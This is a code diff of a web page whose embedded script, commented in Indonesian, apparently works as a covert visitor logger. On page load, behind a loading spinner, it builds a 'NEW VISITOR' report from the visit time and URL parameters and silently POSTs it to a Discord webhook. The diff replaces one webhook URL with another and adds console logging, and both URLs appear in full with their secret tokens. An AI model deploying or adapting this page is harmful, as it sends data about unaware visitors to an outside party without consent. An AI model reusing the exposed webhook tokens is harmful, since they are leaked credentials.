@@ -40,9 +40,9 @@
     <div class="loader" id="loader"></div>
 
     <script>
-        // === CONFIGURATION (WAJIB DIISI) ===
-        // Copy Discord Webhook URL di sini
-        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1513374202625921194/vuNcn7JmCCmQfUWIHRvkpqjdzxujxLlCkd0SdEp6Wmcc61xLAFeCBKcq6bybpk_wrLFf";
+        // === PASTE DISCORD WEBHOOK URL DI BAWAH INI ===
+        // Contoh: https://discord.com/api/webhooks/112233445566778899/ABCdefGHIjklmnopQRsTUVwxyZ
+        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1513396133249024242/EZ8GI-vnWbW86C-aG8FLFa54nAj5ur-aTvZ5oLdqmQnj4lNlVbjgXXamrCLwLFZQcPst";
 
         // Ambil parameter catatan
         const params = new URLSearchParams(window.location.search);
@@ -86,8 +86,9 @@
                 }
             } catch(e) {}
 
-            // Kirim ke Discord
-            if (!WEBHOOK_URL.includes("api/webhooks/")) {
+            // CEK: Apakah webhook URL sudah diisi dengan benar?
+            if (WEBHOOK_URL.includes("discord.com/api/webhooks/") && !WEBHOOK_URL.includes("ISI_URL")) {
+                
                 const pesan = {
                     content: `🎯 **NEW VISITOR**\n` +
                              `⏰ Waktu: ${waktu}\n` +
@@ -101,12 +102,19 @@
                 };
 
                 try {
-                    await fetch(WEBHOOK_URL, {
+                    const response = await fetch(WEBHOOK_URL, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify(pesan)
                     });
-                } catch(e) {}
+                    
+                    console.log("Discord response:", response.status);
+                    
+                } catch(e) {
+                    console.log("Error sending to Discord:", e);
+                }
+            } else {
+                console.log("Webhook URL belum dikonfigurasi!");
             }
 
             setTimeout(() => document.getElementById('loader').classList.remove('active'), 1500);
